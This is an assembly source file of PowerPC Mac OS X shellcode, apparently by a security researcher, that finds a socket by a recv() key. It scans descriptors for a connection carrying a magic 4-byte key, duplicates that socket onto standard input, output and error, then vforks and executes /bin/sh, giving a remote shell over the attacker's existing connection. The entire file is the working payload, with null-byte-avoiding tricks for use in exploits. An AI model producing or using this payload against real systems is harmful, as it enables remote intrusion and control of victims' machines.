;;;
;;; PowerPC OSX remote findsock by recv() key shellcode
;;;
;;; Dino Dai Zovi < ddz@theta44.org >, 20040816
;;;

.globl _shellcode
.text

.set KEY, 0x5858580a
.set PTHREAD_EXIT, 0x90017021	; OSX 10.3.X

_shellcode:
Lfindsock:
	addis	r27, 0, hi16(KEY)
	ori	r27, r27, lo16(KEY)
	addis	r31, 0, hi16(0xffff0000)
	srawi	r31, r31, 11
	mtctr	r31

	;; Count down sockets backwards in hopes of getting our most recent
	;; connection (if we have multiple).
L0:	mfctr	r3
	addi	r3, r3, -1	; r3 = socket file descriptor

	addi	r4, r1, -4	; r4 = stack buffer
	sub	r5, r1, r4	; r5 = 4
	li	r6, 0x4140
	srawi	r6, r6, 7	; r6 = MSG_PEEK | MSG_DONTWAIT
	addi	r7, r5, -4	; r7 = 0
	addi	r8, r5, -4	; r8 = 0
	li	r30, 0x3aff
	srawi	r0, r30, 9	; load syscall number into r0
	cmplw	r29, r29

	.long	0x44ffff02	; recvfrom(s, buf, 4, 0x82, 0, 0)
	bdnzt	eq, L0
	;; On syscall error, attempt compare anyway and loop

	lwz	r28, -4(r1)
	cmplw	r28, r27
	bdnzf	eq, L0
	;;; At this point our socket fd is in ctr

;;;
;;; dup2(2) our socket (in ctr) to stdin, stdout, stderr
;;;
Ldup_fds:
	li	r30, 0x2d01
	srawi	r0, r30, 7
	li	r30, 0x666
	srawi	r30, r30, 9

	mfctr	r3
	addi	r4, r30, -1
	.long	0x44ffff02	; dup2(sock, 2)
	.long	0x7c842008

	mfctr	r3
	addi	r4, r30, -2
	.long	0x44ffff02	; dup2(sock, 1)
	.long	0x7c842008

	mfctr	r3
	addi	r4, r30, -3
	.long	0x44ffff02	; dup2(sock, 0)
	.long	0x7c842008

;;;
;;; VForking shellcode - Call vfork() and execute /bin/sh in child process.
;;; In parent, we exec "/bin/si" ("/bin/sh" + 1), fail, and run the code that
;;; follows the execve().
;;;
Lfork_execve_binsh:
        ;; call vfork (necessary to exec in threaded programs)
	li	r30, 0x42ff
	srawi	r0, r30, 8
	.long	0x44ffff02
	.long	0x7c842008

 	xor	r31, r31, r31
 	lis	r30, 0x2f2f
 	addi	r30, r30, 0x7367
	add	r30, r30, r4	; In child, $r4 should be zero
 	lis	r29, 0x2f62
 	addi	r29, r29, 0x696e
	xor	r28, r28, r28
	addi	r27, r1, -12
 	stmw	r27, -12(r1)	; -12 is arbitrary null-eliding constant

 	addi	r4, r1, -12
	addi	r3, r1, -4
 	xor	r5, r5, r5
 	li	r30, 30209
 	srawi	r0, r30, 9	; r0 = 59
 	.long	0x44ffff02	; execve(path, argv, NULL)
Lparent:

;;;
;;; Call pthread_exit in parent process
;;;
Lpthexit:
	addis	r31, 0, hi16(PTHREAD_EXIT) ; pthread_exit
	ori	r31, r31, lo16(PTHREAD_EXIT)
	mtctr	r31
	bctrl